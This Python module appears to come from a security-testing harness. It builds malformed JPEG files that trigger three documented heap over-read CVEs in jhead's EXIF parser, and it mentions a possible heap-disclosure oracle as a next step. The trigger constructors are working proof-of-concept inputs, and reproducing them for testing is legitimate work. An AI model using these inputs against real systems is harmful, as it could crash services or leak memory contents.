"""Directed triggers for heap over-reads behind the JPEG/EXIF container format (CWE-125).

jhead's JPEG-reachable defects are unbounded pointer reads in the marker/EXIF walk, not buffer
writes -- the string copies are all length-clamped, but the section/offset arithmetic is not. Each
is reached by `jhead <file>` on a VALID JPEG whose one malformed marker or EXIF field drives the
read past the section the parser allocated. A blind fuzzer rarely lands these: it has to keep a
parseable JPEG (SOI, a well-formed APP1/Exif TIFF directory) while making one length or format
field inconsistent, and random mutation breaks the marker framing first. Once a detector has
narrowed to the sink, the trigger is a single construction -- no campaign.

Three documented shapes, all heap over-READs reproduced on the ASan build as `heap-buffer-overflow
READ` (L1), all delivered inside a valid JPEG container:

  * tiny_app1  (CVE-2020-26208): an APP1 marker whose section length is 2 (no payload). jhead
    mallocs the 2-byte section and `memcmp(Data+2, "Exif", 4)` reads four bytes past it.
  * short_exif (CVE-2018-6612):  an APP1 "Exif\\0\\0" section shorter than 16 bytes. jhead reads
    `Get32u(ExifSection+12)` for the first-IFD offset before the length is checked.
  * gps_wrongfmt (CVE-2020-6625): a GPS sub-IFD whose GPS_LATITUDE tag has the wrong format
    (ULONG, inline) so ProcessGpsInfo's three-component loop reads `Get32s(ValuePtr+4+a*size)`
    past the inline value and the section.

The over-read bytes feed internal comparisons / offset words here, so this is an honest L1 (a
reproduced out-of-bounds read), not a disclosure. The jhead instance that WOULD reach L3 is the GPS
coordinate the over-read feeds into the printed summary (ProcessGpsInfo -> ImageInfo.GpsLat): a
complete JPEG that reaches ShowImageInfo would print a heap-derived coordinate, and a differential
oracle over the inline offset would confirm the disclosure. That path (a numeric disclosure oracle)
is the named next step; it is not claimed here.

The container builder (`_jpeg`) and the EXIF/TIFF directory helper are shared, so adding another
JPEG/EXIF sink is a short addition, as with the GIF palette and ZIP method constructors.
"""
from __future__ import annotations

import struct

_SOI = b"\xff\xd8"
_EOI = b"\xff\xd9"
_APP1 = b"\xff\xe1"

# EXIF value formats (jhead.h)
FMT_ULONG = 4
FMT_URATIONAL = 5
# GPS sub-IFD tags (gpsinfo.c)
_TAG_GPSINFO = 0x8825      # IFD0 tag pointing at the GPS sub-IFD
_TAG_GPS_LAT = 2


def _jpeg(segments: bytes) -> bytes:
    """Wrap marker `segments` as a JPEG between SOI and EOI."""
    return _SOI + segments + _EOI


def _app1(payload: bytes) -> bytes:
    """An APP1 marker carrying `payload` (the 2-byte length counts itself)."""
    return _APP1 + struct.pack(">H", len(payload) + 2) + payload


def tiny_app1() -> bytes:
    """CVE-2020-26208: an APP1 section of length 2 -- a 2-byte allocation that `memcmp(Data+2,
    "Exif", 4)` reads past."""
    return _jpeg(_APP1 + struct.pack(">H", 2))


def short_exif() -> bytes:
    """CVE-2018-6612: an APP1 "Exif\\0\\0" section shorter than 16 bytes, so the unguarded
    `Get32u(ExifSection+12)` first-offset read runs past it."""
    exif = b"Exif\x00\x00" + b"MM\x00\x2a\x00\x00\x00"      # 6 + 7 = 13 bytes < 16
    return _jpeg(_app1(exif))


def gps_wrongfmt(*, inline: bytes = b"\x01\x00\x00\x00", trailing: bytes = b"") -> bytes:
    """CVE-2020-6625: a GPS sub-IFD whose GPS_LATITUDE tag has format ULONG (not URATIONAL) and a
    single inline component, so ProcessGpsInfo's fixed three-component loop reads past the inline
    value and the section (`Get32s(ValuePtr+4+a*4)` for a=0,1,2).

    `trailing` plants bytes after the GPS IFD inside the section; `inline` is the 4-byte value the
    read starts from -- the hooks a future disclosure oracle would vary to confirm the leak.
    """
    # TIFF (little-endian): header -> IFD0 (one GPSInfo pointer) -> GPS sub-IFD (one GPS_LAT entry)
    hdr = b"II" + struct.pack("<H", 0x2A) + struct.pack("<I", 8)
    gps_off = 8 + (2 + 12 + 4)                              # IFD0 occupies [8, 26)
    ifd0 = (struct.pack("<H", 1)
            + struct.pack("<HHI", _TAG_GPSINFO, FMT_ULONG, 1) + struct.pack("<I", gps_off)
            + struct.pack("<I", 0))
    gps = (struct.pack("<H", 1)
           + struct.pack("<HHI", _TAG_GPS_LAT, FMT_ULONG, 1) + inline
           + struct.pack("<I", 0))
    return _jpeg(_app1(b"Exif\x00\x00" + hdr + ifd0 + gps + trailing))


# The triggers a directed stage detonates, in order: simplest and most version-robust first.
TRIGGERS = (
    ("tiny_app1", tiny_app1),
    ("short_exif", short_exif),
    ("gps_wrongfmt", gps_wrongfmt),
)
